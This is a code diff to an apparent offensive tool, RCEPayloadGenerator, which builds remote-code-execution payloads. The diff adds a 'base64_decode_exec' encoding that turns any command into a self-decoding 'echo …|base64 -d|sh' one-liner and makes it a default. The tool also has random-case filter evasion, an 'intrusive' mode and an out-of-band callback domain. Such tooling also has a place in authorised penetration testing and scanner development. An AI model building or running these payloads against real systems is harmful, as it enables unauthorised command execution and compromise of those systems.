@@ -133,12 +133,24 @@ class RCEPayloadGenerator:
             "none": lambda x: x,
             "url_encode": lambda x: urllib.parse.quote(x),
             "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
+            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
+            # Self-contained: carries its own decoder, so it runs as-is on a shell.
+            "base64_decode_exec": lambda x: f"echo {base64.b64encode(x.encode()).decode()}|base64 -d|sh",
+            # Bare blobs: only work where the *sink* base64/hex-decodes the input.
+            # Opt-in, and never in the default set, so plain-text output cannot be
+            # copied as a payload that silently does nothing on the target.
             "base64": lambda x: base64.b64encode(x.encode()).decode(),
             "hex": lambda x: x.encode().hex(),
-            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
             "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
             "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
         }
+        # Bare encodings that need a decoder at the sink to ever execute. They are
+        # excluded from the default set and flagged loudly for text output.
+        self.decoder_required_encodings = {"base64", "hex", "base64_then_url", "double_base64"}
+        # Default encodings emit only payloads that run as-is on the receiving
+        # channel/sink (or carry their own decoder); decoder-required blobs above
+        # must be requested explicitly with --encodings.
+        self.default_encodings = ["none", "url_encode", "double_url_encode", "random_case", "base64_decode_exec"]
 
     def _load_template_payloads(self) -> None:
         """Load payload templates from JSON/YAML files."""
@@ -366,6 +378,9 @@ class RCEPayloadGenerator:
         # that silently fails for the operator.
         if enc_name == "random_case" and runner not in self.case_insensitive_runners:
             return False
+        # The base64 decode-and-run harness assumes a POSIX shell interpreter.
+        if enc_name == "base64_decode_exec" and runner != "sh":
+            return False
         return True
 
     def _escape_for_context(self, payload: str, escape: str) -> str:
@@ -405,7 +420,7 @@ class RCEPayloadGenerator:
         generated_payloads: Set[str] = set()
         contexts = selected_contexts if selected_contexts else list(self.default_contexts)
         encodings = selected_encodings if selected_encodings else (
-            self.safe_detection_encodings if mode == "detection" else list(self.encoding_methods.keys())
+            self.safe_detection_encodings if mode == "detection" else list(self.default_encodings)
         )
 
         if mode == "detection":
@@ -1028,6 +1043,17 @@ def main():
         max_safety = "intrusive"
         if not oob_domain:
             oob_domain = "oob.interact.sh"
+
+    if args.output_format == "text" and not args.include_metadata and selected_encodings:
+        risky = sorted(set(selected_encodings) & generator.decoder_required_encodings)
+        if risky:
+            print(
+                f"[!] Warning: encoding(s) {risky} emit bare blobs that only execute where the "
+                "SINK base64/hex-decodes the input. In plain text they may look like working "
+                "payloads but do nothing on their own. Use --include-metadata (or --output-format "
+                "jsonl) to see the required decode path, or use base64_decode_exec for a "
+                "self-contained shell payload."
+            )
 
     count = generator.save_payloads_to_file(
         file_path=args.output,
